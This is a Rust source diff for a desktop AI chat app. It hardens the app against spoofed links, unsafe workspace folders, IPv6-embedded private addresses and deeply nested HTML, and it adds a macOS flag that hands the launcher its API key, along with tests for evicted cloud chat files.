@@ -5,6 +5,7 @@ use std::sync::Arc;
 use tauri::ipc::Channel;
 use tauri::Manager;
 
+pub mod artifact_net;
 pub mod cloud;
 pub mod doc_confinement;
 #[cfg(all(windows, feature = "windows-confinement"))]
@@ -111,6 +112,10 @@ fn stage_artifact(
     if html.len() > MAX_STAGED_BYTES {
         return Err("that artifact is too large to render".into());
     }
+    // Not run at all on macOS unless the engine is refusing network addresses
+    // (A1); everywhere, the hints that reach out are stripped first.
+    artifact_net::ready()?;
+    let html = artifact_net::harden(&html);
     // Content-addressed, so re-rendering the same artifact reuses its entry
     // rather than growing the map on every keystroke-sized re-render.
     let id = format!("{:016x}", fnv1a(html.as_bytes()));
@@ -186,6 +191,31 @@ const MODEL: &str = glm::DEFAULT_MODEL;
 // failed, which is exactly why it went unnoticed — and a silent reroute is a
 // dependency on someone else's grace, not a working configuration.
 const VISION_MODEL: &str = "mistral-small-3.2-24b-instruct-2506";
+
+/// Add an instruction to this one request, in a place `model` accepts.
+///
+/// The tool loop tells the model to wrap up, once when its budget runs low and
+/// once when the rounds are spent, by adding a message after the tool results.
+/// GLM-5.2 takes that. The vision model does not: Mistral's validator allows
+/// only `assistant` or `tool` after a `tool` message, so every chat with an
+/// image in it, tools on and a few rounds of research failed with Scaleway's
+/// "Unexpected role 'system' after role 'tool'" (found by the owner on 1.10.6).
+/// For Mistral the instruction joins the leading system message instead, which
+/// is valid wherever the conversation stands. GLM keeps the message it has
+/// always had, where it is.
+fn add_instruction(messages: &mut Vec<serde_json::Value>, role: &str, text: &str, model: &str) {
+    if model != VISION_MODEL {
+        messages.push(serde_json::json!({ "role": role, "content": text }));
+        return;
+    }
+    match messages.first_mut() {
+        Some(first) if first["role"] == "system" && first["content"].is_string() => {
+            let joined = format!("{}\n\n{text}", first["content"].as_str().unwrap_or(""));
+            first["content"] = serde_json::Value::String(joined);
+        }
+        _ => messages.insert(0, serde_json::json!({ "role": "system", "content": text })),
+    }
+}
 
 /// Scaleway's output ceiling for glm-5.2 — it rejects anything larger with
 /// "max_completion_tokens is limited to 16384". Every path that writes a full
@@ -321,9 +351,10 @@ struct Secrets {
     image_token_origin: String,
     /// Optional second Scaleway key used only by the claude-glm installer.
     /// Empty means "share the chat key", which is what every install before
-    /// 1.2.0 did — and why terminal usage and app usage are indistinguishable
-    /// on a Scaleway invoice. A key belonging to its own Project separates
-    /// them there; it changes nothing about the in-app tally, which only ever
+    /// 1.2.0 did. A separate key can be revoked on its own and kept to model
+    /// access only. It does not separate the two on a Scaleway invoice:
+    /// Generative APIs bill the Project in the request URL, and the app and
+    /// the launcher both use the default Project's. The in-app tally only ever
     /// counts what the app itself sent.
     #[serde(default)]
     claude_glm_api_key: String,
@@ -381,6 +412,74 @@ fn load_secrets() -> Result<Secrets, String> {
     };
     *SECRETS_CACHE.lock().unwrap() = Some(s.clone());
     Ok(s)
+}
+
+/// The flag the claude-glm launcher starts this binary with, on macOS.
+pub const TERMINAL_KEY_FLAG: &str = "--sovatela-terminal-key";
+
+/// The key terminal access uses: its own if one is set, else the chat key,
+/// which is what the launcher has always fallen back to.
+#[cfg_attr(not(target_os = "macos"), allow(dead_code))]
+fn terminal_key(s: &Secrets) -> &str {
+    let own = s.claude_glm_api_key.trim();
+    if own.is_empty() {
+        s.scaleway_api_key.trim()
+    } else {
+        own
+    }
+}
+
+/// Started with `TERMINAL_KEY_FLAG`, print the terminal key and exit.
+///
+/// The launcher used to read the whole credential item with
+/// `/usr/bin/security`, and our documents told people to answer the prompt
+/// with Always Allow. That grant belongs to `security`, so it let any program
+/// read every key stored here, silently (the 1.10.6 review, T1). The item
+/// already trusts this app, so asking the app reads nothing more than it
+/// could, prompts no one, and hands over one key rather than all of them. Any
+/// program can still run this and get that one key; SECURITY.md says so.
+///
+/// It refuses to print to a terminal, so the key is not left on a screen or in
+/// a scrollback by someone trying the flag. Exit 3 means no key is stored.
+#[cfg(target_os = "macos")]
+pub fn run_terminal_key_if_requested() -> bool {
+    use std::io::{IsTerminal as _, Write as _};
+    let mut args = std::env::args().skip(1);
+    if args.next().as_deref() != Some(TERMINAL_KEY_FLAG) {
+        return false;
+    }
+    let code = if args.next().is_some() {
+        eprintln!("{TERMINAL_KEY_FLAG} takes no arguments");
+        64
+    } else if std::io::stdout().is_terminal() {
+        eprintln!(
+            "{TERMINAL_KEY_FLAG} prints a secret, so it does not print to a terminal. \
+             It is for the claude-glm launcher."
+        );
+        2
+    } else {
+        match load_secrets() {
+            Ok(s) if terminal_key(&s).is_empty() => {
+                eprintln!("No Scaleway API key is stored in Sovatela yet.");
+                3
+            }
+            Ok(s) => {
+                let mut out = std::io::stdout();
+                match out
+                    .write_all(terminal_key(&s).as_bytes())
+                    .and_then(|()| out.flush())
+                {
+                    Ok(()) => 0,
+                    Err(_) => 1,
+                }
+            }
+            Err(e) => {
+                eprintln!("{e}");
+                1
+            }
+        }
+    };
+    std::process::exit(code);
 }
 
 fn save_secrets(s: &Secrets) -> Result<(), String> {
@@ -865,12 +964,75 @@ mod external_links {
 /// same reason: a guard the renderer enforces is a guard a compromised renderer
 /// does not have.
 #[tauri::command]
-async fn open_external(app: tauri::AppHandle, url: String) -> Result<(), String> {
+async fn open_external(
+    app: tauri::AppHandle,
+    url: String,
+    shown: Option<String>,
+) -> Result<(), String> {
     use tauri_plugin_opener::OpenerExt;
     let url = vetted_external_url(&url)?;
+    // Asked here rather than in the interface, like every other confirmation
+    // that guards something the model can steer.
+    if let Some(shown_host) = shown.as_deref().and_then(|s| shown_host_differs(s, &url)) {
+        let real = reqwest::Url::parse(&url)
+            .ok()
+            .and_then(|u| u.host_str().map(str::to_string))
+            .unwrap_or_default();
+        let approved = tokio::task::spawn_blocking({
+            let app = app.clone();
+            let url = url.clone();
+            move || {
+                confirm_destructive(
+                    &app,
+                    "This link goes somewhere else",
+                    &format!(
+                        "The link shows {shown_host}, but it opens {real}:\n\n{url}\n\n\
+                         A reply can make a link look like one address and lead to another. \
+                         Open it only if you expected {real}."
+                    ),
+                    "Open",
+                )
+            }
+        })
+        .await
+        .map_err(|e| e.to_string())?;
+        if !approved {
+            return Err(CANCELLED.into());
+        }
+    }
     app.opener()
         .open_url(url, None::<String>)
         .map_err(|e| e.to_string())
+}
+
+/// The host a link's visible text names, when it names one other than where
+/// the link goes.
+///
+/// A reply can show "https://console.scaleway.com" as the text of a link to
+/// anywhere, and the window has no status bar to give it away (the 1.10.6
+/// review, L1). Only text that reads as an address is compared: "the Scaleway
+/// console" claims no host, and the title on hover says where it goes.
+/// `www.` is ignored on both sides.
+fn shown_host_differs(shown: &str, url: &str) -> Option<String> {
+    let token = shown.split_whitespace().next()?;
+    let candidate = if token.contains("://") {
+        token.to_string()
+    } else {
+        format!("https://{token}")
+    };
+    let named = reqwest::Url::parse(&candidate).ok()?;
+    let named = named.host_str()?.to_ascii_lowercase();
+    // A host has a dot and ends in letters; "v1.2" or "e.g." is not one.
+    let tld = named.rsplit('.').next().unwrap_or("");
+    if !named.contains('.') || tld.len() < 2 || !tld.chars().all(|c| c.is_ascii_alphabetic()) {
+        return None;
+    }
+    let real = reqwest::Url::parse(url)
+        .ok()?
+        .host_str()?
+        .to_ascii_lowercase();
+    let bare = |h: &str| h.strip_prefix("www.").unwrap_or(h).to_string();
+    (bare(&named) != bare(&real)).then_some(named)
 }
 
 #[tauri::command]
@@ -1751,6 +1913,43 @@ async fn get_workspace_dir(app: tauri::AppHandle) -> Result<String, String> {
     Ok(load_settings(&app)?.workspace_dir)
 }
 
+fn canonical_home<R: tauri::Runtime>(app: &tauri::AppHandle<R>) -> Option<std::path::PathBuf> {
+    app.path()
+        .home_dir()
+        .ok()
+        .and_then(|h| std::fs::canonicalize(h).ok())
+}
+
+/// The saved workspace the tools may use, or why it is not used.
+///
+/// Before 1.10.7 any folder could be chosen, the home folder included, and
+/// that is now refused (the 1.10.6 review, W1). A folder saved before then is
+/// not used rather than silently changed: the setting stays as it was, the
+/// chat says why the workspace is off, and so does Settings.
+fn granted_workspace<R: tauri::Runtime>(
+    app: &tauri::AppHandle<R>,
+    settings: &AppSettings,
+) -> Result<Option<std::path::PathBuf>, String> {
+    let d = settings.workspace_dir.trim();
+    let p = std::path::PathBuf::from(d);
+    if d.is_empty() || !p.is_dir() {
+        return Ok(None);
+    }
+    match workspace::refuse_as_workspace(&p, canonical_home(app).as_deref()) {
+        Some(why) => Err(why),
+        None => Ok(Some(p)),
+    }
+}
+
+/// Why the saved workspace folder is not used, for Settings to show; empty
+/// when it is used or there is none.
+#[tauri::command]
+async fn workspace_problem(app: tauri::AppHandle) -> Result<String, String> {
+    Ok(granted_workspace(&app, &load_settings(&app)?)
+        .err()
+        .unwrap_or_default())
+}
+
 /// Grant the workspace by opening the native folder picker here, in the
 /// backend, and storing what it returned.
 ///
@@ -1791,6 +1990,9 @@ async fn choose_workspace_dir(app: tauri::AppHandle) -> Result<String, String> {
         .map_err(|e| format!("{} could not be opened: {e}", path.display()))?;
     if !canonical.is_dir() {
         return Err(format!("{} is not a folder.", canonical.display()));
+    }
+    if let Some(why) = workspace::refuse_as_workspace(&canonical, canonical_home(&app).as_deref()) {
+        return Err(why);
     }
     let dir = canonical.to_string_lossy().into_owned();
 
@@ -5456,6 +5658,9 @@ fn is_private_ip(ip: std::net::IpAddr) -> bool {
                 || seg[..2] == [0x2001, 0] // Teredo 2001::/32 carries IPv4 addresses too
                 || seg[..2] == [0x2001, 0x0db8] // documentation 2001:db8::/32
                 || seg[..3] == [0x64, 0xff9b, 1] // local-use NAT64 64:ff9b:1::/48
+                // IPv4-translated ::ffff:0:0/96 (RFC 2765) embeds V4 as well; it was
+                // missing until the 1.10.6 review (I1). Refused whole, like NAT64.
+                || (seg[..4] == [0, 0, 0, 0] && seg[4] == 0xffff && seg[5] == 0)
         }
     }
 }
@@ -5579,6 +5784,23 @@ async fn within_deadline<T>(
     })
 }
 
+/// `fut`, or "Stopped." as soon as the request is cancelled. Stop used to be
+/// checked only between rounds, so it waited for a page read to finish.
+async fn until_cancelled<T>(
+    cancel: &Option<Arc<AtomicBool>>,
+    fut: impl std::future::Future<Output = Result<T, String>>,
+) -> Result<T, String> {
+    let stopped = async {
+        while !is_cancelled(cancel) {
+            tokio::time::sleep(std::time::Duration::from_millis(100)).await;
+        }
+    };
+    tokio::select! {
+        r = fut => r,
+        () = stopped => Err("Stopped.".to_string()),
+    }
+}
+
 async fn fetch_page(url: &str) -> Result<String, String> {
     within_deadline(
         FETCH_DEADLINE,
@@ -5652,7 +5874,7 @@ async fn fetch_page_unbounded(url: &str) -> Result<String, String> {
     }
 
     let text = if content_type.contains("html") || content_type.is_empty() {
-        html2text::from_read(bytes.as_slice(), 100).map_err(|e| e.to_string())?
+        html_to_text_off_runtime(bytes).await?
     } else if content_type.contains("json") || content_type.starts_with("text/") {
         String::from_utf8_lossy(&bytes).to_string()
     } else {
@@ -5673,6 +5895,159 @@ async fn fetch_page_unbounded(url: &str) -> Result<String, String> {
         ));
     }
     Ok(text)
+}
+
+/// Deeper than this, a page is refused rather than converted. WebKit stops
+/// nesting at 512 itself, so no page a browser shows is deeper.
+const PAGE_MAX_DEPTH: usize = 512;
+
+/// A page as readable text, or a refusal if it is nested too deeply to convert.
+///
+/// html2text recurses once per level of nesting. A page of 30,000 nested
+/// `<ul>` or `<blockquote>`, about 117 KiB, overflowed the 2 MiB stack of the
+/// thread converting it, and a stack overflow aborts the whole app; it cannot
+/// be caught (the 1.10.6 review, R1). Parsing does not recurse: html5ever
+/// builds the tree iteratively and its nodes are dropped iteratively too. So
+/// the page is parsed, its depth measured with a loop, and only then handed to
+/// the part that recurses.
+fn html_to_text(bytes: &[u8]) -> Result<String, String> {
+    // Parsing is not quadratic-free either: for each block it opens, html5ever
+    // looks through every element still open, so 20,000 nested `<div>` took
+    // 0.6 s to parse and a 2 MiB page of them would take minutes. A cheap
+    // count of the raw tags refuses that before the parser starts.
+    if rough_depth(bytes) > 2 * PAGE_MAX_DEPTH {
+        return Err(too_deep());
+    }
+    let config = html2text::config::plain();
+    let dom = config.parse_html(bytes).map_err(|e| e.to_string())?;
+    let mut deepest = 0;
+    let mut stack = vec![(dom.document.clone(), 0usize)];
+    while let Some((node, depth)) = stack.pop() {
+        deepest = deepest.max(depth);
+        if deepest > PAGE_MAX_DEPTH {
+            return Err(too_deep());
+        }
+        for child in node.children.borrow().iter() {
+            stack.push((child.clone(), depth + 1));
+        }
+    }
+    let tree = config.dom_to_render_tree(&dom).map_err(|e| e.to_string())?;
+    config
+        .render_to_string(tree, 100)
+        .map_err(|e| e.to_string())
+}
+
+fn too_deep() -> String {
+    format!(
+        "the page is nested more than {PAGE_MAX_DEPTH} levels deep, which no page a browser \
+         shows is, so it was not read"
+    )
+}
+
+/// The deepest nesting the raw tags of a page could produce, overestimated.
+///
+/// One pass over the bytes: a start tag counts one level and an end tag takes
+/// one away. Tags that cannot hold another of their kind, or that close
+/// themselves (`p`, `li`, `td`, `br`, …), are not counted, nor is anything
+/// inside a comment or a script, style, title or textarea. It errs high: a
+/// `<div` inside an attribute counts, and a `<div/>` counts, because the
+/// parser opens one for it. Erring high only ever refuses a page, and
+/// `html_to_text` measures the real tree after parsing anyway.
+fn rough_depth(bytes: &[u8]) -> usize {
+    const NOT_NESTING: &[&[u8]] = &[
+        b"area",
+        b"base",
+        b"br",
+        b"col",
+        b"embed",
+        b"hr",
+        b"img",
+        b"input",
+        b"link",
+        b"meta",
+        b"param",
+        b"source",
+        b"track",
+        b"wbr",
+        b"p",
+        b"li",
+        b"dt",
+        b"dd",
+        b"tr",
+        b"td",
+        b"th",
+        b"option",
+        b"optgroup",
+        b"rb",
+        b"rt",
+        b"rp",
+        b"thead",
+        b"tbody",
+        b"tfoot",
+        b"colgroup",
+        b"caption",
+        b"html",
+        b"head",
+        b"body",
+    ];
+    const RAW_TEXT: &[&[u8]] = &[b"script", b"style", b"title", b"textarea", b"xmp"];
+    let find = |from: usize, needle: &[u8]| {
+        bytes[from.min(bytes.len())..]
+            .windows(needle.len())
+            .position(|w| w.eq_ignore_ascii_case(needle))
+            .map(|i| from + i)
+    };
+    let (mut depth, mut deepest, mut i) = (0usize, 0usize, 0usize);
+    while let Some(at) = bytes[i..].iter().position(|&b| b == b'<').map(|p| i + p) {
+        let rest = &bytes[at + 1..];
+        if rest.starts_with(b"!--") {
+            i = find(at + 4, b"-->").map_or(bytes.len(), |e| e + 3);
+            continue;
+        }
+        let (closing, name_at) = if rest.first() == Some(&b'/') {
+            (true, at + 2)
+        } else {
+            (false, at + 1)
+        };
+        let name_len = bytes[name_at.min(bytes.len())..]
+            .iter()
+            .take_while(|b| b.is_ascii_alphanumeric())
+            .count();
+        if name_len == 0 || !bytes[name_at].is_ascii_alphabetic() {
+            i = at + 1;
+            continue;
+        }
+        let name = bytes[name_at..name_at + name_len].to_ascii_lowercase();
+        i = name_at + name_len;
+        if NOT_NESTING.contains(&name.as_slice()) {
+            continue;
+        }
+        if closing {
+            depth = depth.saturating_sub(1);
+        } else if RAW_TEXT.contains(&name.as_slice()) {
+            let mut end = b"</".to_vec();
+            end.extend_from_slice(&name);
+            i = find(i, &end).unwrap_or(bytes.len());
+        } else {
+            depth += 1;
+            deepest = deepest.max(depth);
+        }
+    }
+    deepest
+}
+
+/// `html_to_text`, on a thread of its own.
+///
+/// Converting is CPU work with no await in it, so run inside the fetch it held
+/// a runtime worker and the page reader's deadline could not interrupt it: a
+/// page built to be slow to convert returned after 60 seconds under a
+/// 45-second limit (the 1.10.6 review, R2). On a blocking thread the deadline
+/// and Stop can abandon it. The thread still finishes its work, which the
+/// depth limit and the size cap keep bounded.
+async fn html_to_text_off_runtime(bytes: Vec<u8>) -> Result<String, String> {
+    tokio::task::spawn_blocking(move || html_to_text(&bytes))
+        .await
+        .map_err(|_| "converting that page failed".to_string())?
 }
 
 /// Evaluate an arithmetic expression safely. `meval` is a pure-Rust f64
@@ -5787,6 +6162,8 @@ struct ToolCtx<'a, R: tauri::Runtime> {
     backend: Option<&'a SearchBackend>,
     workspace: Option<&'a std::path::Path>,
     app: &'a tauri::AppHandle<R>,
+    /// Stop, for a tool slow enough to be worth abandoning mid-call.
+    cancel: &'a Option<Arc<AtomicBool>>,
 }
 
 /// Run one agent tool call and return its result for the model. Failures are
@@ -5845,7 +6222,7 @@ async fn execute_tool<R: tauri::Runtime>(
                 .and_then(|u| u.host_str().map(str::to_string))
                 .unwrap_or_else(|| url.clone());
             let _ = on_event.send(StreamEvent::Status(format!("📄 Reading {host}…")));
-            match fetch_page(&url).await {
+            match until_cancelled(ctx.cancel, fetch_page(&url)).await {
                 Ok(text) => text,
                 Err(e) => {
                     let _ =
@@ -6061,7 +6438,7 @@ fn write_preview(content: &str, built: bool) -> String {
             }
         })
         .collect();
-    let more = content.lines().count() > LINES;
+    let hidden = content.lines().count().saturating_sub(LINES);
     let intro = if built {
         "It will be built from text that begins:"
     } else {
@@ -6070,11 +6447,15 @@ fn write_preview(content: &str, built: bool) -> String {
     if shown.iter().all(|l| l.trim().is_empty()) {
         return "It is empty, or begins with blank lines.".into();
     }
-    format!(
-        "{intro}\n{}{}",
-        shown.join("\n"),
-        if more { "\n…" } else { "" }
-    )
+    // The count, not just "…": a payload placed below the lines shown was the
+    // part of a write nobody saw (the 1.10.6 review, W1), and a number says how
+    // much is unseen in a way an ellipsis does not.
+    let rest = match hidden {
+        0 => String::new(),
+        1 => "\n… and 1 more line, not shown here.".to_string(),
+        n => format!("\n… and {n} more lines, not shown here."),
+    };
+    format!("{intro}\n{}{rest}", shown.join("\n"))
 }
 
 /// Native, blocking confirm dialog for a workspace write. Runs on this request's
@@ -7151,9 +7532,8 @@ async fn run_chat<R: tauri::Runtime>(
             system_parts.push(ctx);
         }
     }
-    if !settings.workspace_dir.trim().is_empty()
-        && std::path::Path::new(settings.workspace_dir.trim()).is_dir()
-    {
+    let workspace_root = granted_workspace(&app, &settings);
+    if let Ok(Some(_)) = workspace_root {
         system_parts.push(
             "You have a file workspace: a folder on the user's computer you can \
              read from and write to with the list_workspace_files, \
@@ -7216,10 +7596,14 @@ async fn run_chat<R: tauri::Runtime>(
     };
 
     // The agent's file workspace, if the user set one (read/write confined to it).
-    let workspace_root: Option<std::path::PathBuf> = {
-        let d = settings.workspace_dir.trim();
-        let p = std::path::PathBuf::from(d);
-        (!d.is_empty() && p.is_dir()).then_some(p)
+    let workspace_root: Option<std::path::PathBuf> = match workspace_root {
+        Ok(root) => root,
+        Err(why) => {
+            let _ = on_event.send(StreamEvent::Status(format!(
+                "The workspace folder is off: {why} Settings → Workspace."
+            )));
+            None
+        }
     };
 
     // Say so once, whichever path we take below. A configured workspace folder
@@ -7321,6 +7705,7 @@ async fn run_chat<R: tauri::Runtime>(
             backend: backend.as_ref(),
             workspace: workspace_root.as_deref(),
             app: &app,
+            cancel: &cancel,
         };
 
         // Multi-round tool loop: force a search on round 0, then let the model
@@ -7364,16 +7749,18 @@ async fn run_chat<R: tauri::Runtime>(
             let searches_left = SEARCH_BUDGET.saturating_sub(searches_used);
             let mut round_msgs = convo.clone();
             if remaining <= 3 || searches_left <= 2 {
-                round_msgs.push(serde_json::json!({
-                    "role": "system",
-                    "content": format!(
+                add_instruction(
+                    &mut round_msgs,
+                    "system",
+                    &format!(
                         "You're low on research budget (about {searches_left} web \
                          search(es) and {remaining} step(s) left). Start concluding: \
                          give your best answer now from what you've already found, \
                          search again only if it is truly essential, and be explicit \
                          about anything you couldn't verify."
-                    )
-                }));
+                    ),
+                    model,
+                );
             }
             // Offer only what is still permitted this turn. Withdrawing the
             // tool is the primary control; `egress_refusal` below is the
@@ -7610,14 +7997,16 @@ async fn run_chat<R: tauri::Runtime>(
         // Rounds exhausted — one final streamed answer-only pass (no tools),
         // with an explicit instruction to wrap up honestly: tell the user what
         // was and wasn't found rather than trailing off mid-investigation.
-        convo.push(serde_json::json!({
-            "role": "user",
-            "content": "You have used all available web searches for this turn. Using ONLY \
+        add_instruction(
+            &mut convo,
+            "user",
+            "You have used all available web searches for this turn. Using ONLY \
                 what you already found, give your best final answer now. Be upfront about \
                 anything you could not retrieve or verify, and say what I could do next \
                 (for example, ask you to keep searching in a follow-up message). Do not \
-                call any tools."
-        }));
+                call any tools.",
+            model,
+        );
         // Extra token headroom so reasoning + a full synthesis both fit.
         let (content, _) = stream_completion_max(
             &client,
@@ -8705,7 +9094,7 @@ async fn import_conversation(app: tauri::AppHandle) -> Result<Option<Conversatio
              Export the chat again and choose JSON to be able to bring it back."
                 .to_string()
         } else {
-            format!("that file is not readable as a chat: {e}")
+            not_a_chat_file(&e)
         }
     })?;
     validate_imported_conversation(&v)?;
@@ -8907,15 +9296,41 @@ fn searchable_text(messages: &serde_json::Value) -> String {
 async fn search_conversations(
     app: tauri::AppHandle,
     query: String,
-) -> Result<Vec<SearchHit>, String> {
+) -> Result<SearchResults, String> {
     let needle = query.trim().to_lowercase();
     if needle.is_empty() {
-        return Ok(Vec::new());
+        return Ok(SearchResults::default());
     }
-    let dir = conversations_dir(&app)?;
-    let mut hits = Vec::new();
+    search_history(&conversations_dir(&app)?, &needle, is_cloud_placeholder)
+}
 
-    for entry in std::fs::read_dir(&dir).map_err(|e| e.to_string())? {
+/// What a search found, and how many chats it could not look inside.
+#[derive(serde::Serialize, Default)]
+struct SearchResults {
+    hits: Vec<SearchHit>,
+    /// Chats whose file is only in the cloud. Their titles were searched, from
+    /// the sidebar's index, and their contents were not: reading one asks
+    /// macOS to download it, and waits for ever when it cannot. The interface
+    /// says how many, so a search that missed them does not look complete.
+    not_on_this_mac: usize,
+}
+
+/// `search_conversations`, with the placeholder check passed in so a test can
+/// stand a file in for an evicted one.
+///
+/// Until the 1.10.6 review (F3b) this read every chat file, evicted or not, so
+/// in a history folder in iCloud Drive a search downloaded every evicted chat
+/// it reached, or hung offline.
+fn search_history(
+    dir: &std::path::Path,
+    needle: &str,
+    is_placeholder: impl Fn(&std::path::Path) -> bool,
+) -> Result<SearchResults, String> {
+    let mut hits = Vec::new();
+    let mut not_on_this_mac = 0usize;
+    let mut index: Option<Vec<ConversationMeta>> = None;
+
+    for entry in std::fs::read_dir(dir).map_err(|e| e.to_string())? {
         if hits.len() >= MAX_SEARCH_HITS {
             break;
         }
@@ -8924,6 +9339,28 @@ async fn search_conversations(
             continue;
         }
         if path.file_name().and_then(|n| n.to_str()) == Some(CONV_INDEX_FILE) {
+            continue;
+        }
+        if is_placeholder(&path) {
+            not_on_this_mac += 1;
+            let index = index.get_or_insert_with(|| read_conv_index(dir));
+            let stem = path.file_stem().and_then(|s| s.to_str()).unwrap_or("");
+            if let Some(meta) = index
+                .iter()
+                .find(|m| sanitize_id(&m.id).is_ok_and(|id| id == stem))
+                .filter(|m| m.title.to_lowercase().contains(needle))
+            {
+                hits.push(SearchHit {
+                    id: meta.id.clone(),
+                    title: meta.title.clone(),
+                    updated_at: meta.updated_at.clone(),
+                    project_id: meta.project_id.clone(),
+                    snippet_before: String::new(),
+                    snippet_match: String::new(),
+                    snippet_after: String::new(),
+                    title_matched: true,
+                });
+            }
             continue;
         }
         // A file that cannot be read is skipped rather than failing the whole
@@ -8950,9 +9387,9 @@ async fn search_conversations(
             continue;
         };
 
-        let title_matched = conv.title.to_lowercase().contains(&needle);
+        let title_matched = conv.title.to_lowercase().contains(needle);
         let body = searchable_text(&conv.messages);
-        let body_at = find_case_insensitive(&body, &needle);
+        let body_at = find_case_insensitive(&body, needle);
 
         if !title_matched && body_at.is_none() {
             continue;
@@ -8974,7 +9411,10 @@ async fn search_conversations(
 
     // Newest first, like the sidebar it replaces.
     hits.sort_by(|a, b| b.updated_at.cmp(&a.updated_at));
-    Ok(hits)
+    Ok(SearchResults {
+        hits,
+        not_on_this_mac,
+    })
 }
 
 #[tauri::command]
@@ -9003,6 +9443,20 @@ async fn load_conversation(app: tauri::AppHandle, id: String) -> Result<Conversa
         &sanitize_id(&id)?,
     );
     Ok(c)
+}
+
+/// The refusal for a file that is not JSON at all.
+///
+/// This was the parser's own message, "that file is not readable as a chat:
+/// expected ident at line 1 column 2", which says nothing about what to choose
+/// instead (the 1.10.6 review, U2). The parser's words are kept at the end, for
+/// whoever has to work out what the file is.
+fn not_a_chat_file(e: &serde_json::Error) -> String {
+    format!(
+        "that file is not a chat Sovatela saved. Choose a .json file made with the ↓ \
+         (Export this chat) button in the chat list, saved as JSON. (The file could not \
+         be read as JSON: {e}.)"
+    )
 }
 
 /// Reduce a typed name to what will be stored.
@@ -9105,16 +9559,43 @@ async fn rename_conversation(
     Ok(clean)
 }
 
+/// The title the delete confirmation names.
+///
+/// It comes off disk rather than from the caller, so the dialog names the chat
+/// that is actually about to go. A chat whose file is only in the cloud is
+/// named from the sidebar's index instead: reading it would ask macOS to
+/// download it, and wait for ever offline, and deleting it needs nothing it
+/// holds. Until the 1.10.6 review (F3b) the file was read either way.
+fn title_to_confirm(
+    dir: &std::path::Path,
+    path: &std::path::Path,
+    id: &str,
+    is_placeholder: impl Fn(&std::path::Path) -> bool,
+) -> String {
+    let title = if is_placeholder(path) {
+        read_conv_index(dir)
+            .into_iter()
+            .find(|m| m.id == id)
+            .map(|m| m.title)
+    } else {
+        std::fs::read_to_string(path)
+            .ok()
+            .and_then(|t| serde_json::from_str::<Conversation>(&t).ok())
+            .map(|c| c.title)
+    };
+    title
+        .filter(|t| !t.trim().is_empty())
+        .unwrap_or_else(|| "Untitled".to_string())
+}
+
 #[tauri::command]
 async fn delete_conversation(app: tauri::AppHandle, id: String) -> Result<(), String> {
-    // The title comes off disk rather than from the caller, so the dialog names
-    // the chat that is actually about to go.
-    let title = std::fs::read_to_string(conversation_path(&app, &id)?)
-        .ok()
-        .and_then(|t| serde_json::from_str::<Conversation>(&t).ok())
-        .map(|c| c.title)
-        .filter(|t| !t.trim().is_empty())
-        .unwrap_or_else(|| "Untitled".to_string());
+    let title = title_to_confirm(
+        &conversations_dir(&app)?,
+        &conversation_path(&app, &id)?,
+        &id,
+        is_cloud_placeholder,
+    );
 
     let approved = tokio::task::spawn_blocking({
         let app = app.clone();
@@ -9635,6 +10116,13 @@ fn detach_conversations_from_project(dir: &std::path::Path, project_id: &str) ->
     let mut detached = 0usize;
     for path in files {
         if path.file_name().and_then(|n| n.to_str()) == Some(CONV_INDEX_FILE) {
+            continue;
+        }
+        // `owned_history_files` already leaves evicted chats out; checked again
+        // here so that this read does not depend on it. Such a chat keeps its
+        // membership, which is harmless: opening a chat ignores a project that
+        // no longer exists (`knownProjectId` in the interface).
+        if is_cloud_placeholder(&path) {
             continue;
         }
         let Ok(text) = std::fs::read_to_string(&path) else {
@@ -10710,6 +11198,245 @@ mod tests {
                 "{caller} no longer reads through read_to_string_capped"
             );
         }
+    }
+
+    /// A file whose read never returns, standing in for an evicted chat read
+    /// offline. A regression that reads it hangs, and `within` turns the hang
+    /// into a failure instead of a test run that never ends.
+    #[cfg(unix)]
+    fn never_readable(path: &std::path::Path) {
+        use std::os::unix::ffi::OsStrExt as _;
+        let c = std::ffi::CString::new(path.as_os_str().as_bytes()).unwrap();
+        assert_eq!(unsafe { libc::mkfifo(c.as_ptr(), 0o600) }, 0);
+    }
+
+    #[cfg(unix)]
+    fn within<T: Send + 'static>(f: impl FnOnce() -> T + Send + 'static) -> T {
+        let (tx, rx) = std::sync::mpsc::channel();
+        std::thread::spawn(move || {
+            let _ = tx.send(f());
+        });
+        rx.recv_timeout(std::time::Duration::from_secs(10))
+            .expect("it read the evicted file, and the read never returned")
+    }
+
+    // F3b of the 1.10.6 review: searching and deleting read every chat file,
+    // evicted or not.
+    #[cfg(unix)]
+    #[test]
+    fn search_does_not_read_a_chat_that_is_only_in_the_cloud() {
+        let dir = temp_dir("search-evicted");
+        std::fs::write(
+            dir.join("here.json"),
+            r#"{"id":"here","title":"Ferry times","updated_at":"2026-10-18T08:00:00Z",
+                "messages":[{"role":"user","text":"when does the ferry leave"}]}"#,
+        )
+        .unwrap();
+        never_readable(&dir.join("away.json"));
+        never_readable(&dir.join("other.json"));
+        std::fs::write(
+            dir.join(CONV_INDEX_FILE),
+            r#"[{"id":"away","title":"Ferry to Aarhus"},{"id":"other","title":"Taxes"}]"#,
+        )
+        .unwrap();
+        let evicted = |p: &std::path::Path| {
+            matches!(
+                p.file_name().and_then(|n| n.to_str()),
+                Some("away.json" | "other.json")
+            )
+        };
+        let found = within(move || search_history(&dir, "ferry", evicted).unwrap());
+        assert_eq!(found.not_on_this_mac, 2);
+        let mut ids: Vec<_> = found.hits.iter().map(|h| h.id.as_str()).collect();
+        ids.sort();
+        // The evicted chat's title still matches, from the index.
+        assert_eq!(ids, ["away", "here"]);
+        let away = found.hits.iter().find(|h| h.id == "away").unwrap();
+        assert!(away.title_matched && away.snippet_match.is_empty());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn deleting_an_evicted_chat_names_it_without_reading_it() {
+        let dir = temp_dir("delete-evicted");
+        let path = dir.join("away.json");
+        never_readable(&path);
+        std::fs::write(
+            dir.join(CONV_INDEX_FILE),
+            r#"[{"id":"away","title":"Ferry to Aarhus"}]"#,
+        )
+        .unwrap();
+        let title = within({
+            let (dir, path) = (dir.clone(), path.clone());
+            move || title_to_confirm(&dir, &path, "away", |_| true)
+        });
+        assert_eq!(title, "Ferry to Aarhus");
+        // A chat on this Mac is still named from its own file.
+        std::fs::remove_file(&path).unwrap();
+        std::fs::write(
+            &path,
+            r#"{"id":"away","title":"From the file","updated_at":"","messages":[]}"#,
+        )
+        .unwrap();
+        assert_eq!(
+            title_to_confirm(&dir, &path, "away", |_| false),
+            "From the file"
+        );
+    }
+
+    /// Every file read in the app is one of three kinds, and a new one fails
+    /// here until somebody decides which (I5 of the 1.10.6 review).
+    ///
